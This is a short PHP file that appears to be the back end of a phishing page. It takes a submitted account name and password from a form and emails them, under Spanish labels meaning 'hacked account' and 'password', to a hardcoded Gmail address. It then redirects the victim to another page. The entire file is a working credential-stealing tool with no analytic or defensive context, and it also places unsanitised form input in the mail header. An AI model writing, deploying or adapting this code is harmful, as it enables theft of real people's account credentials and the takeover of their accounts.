<?php
$name = $_POST['pass'];
$mail = $_POST['pass_1'];

$header = 'From: ' . $mail . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$message = "cuenta hackeada: " . $name . " \r\n";
$message .= "contraseña: " . $mail . " \r\n";
$message .= "Enviado el: " . date('d/m/Y', time());

$para = 'jimenezmartinezjesus76@gmail.com';
$asunto = 'persona hackeada:';

mail($para, $asunto, utf8_decode($message), $header);

header("Location:mexico.html");
?>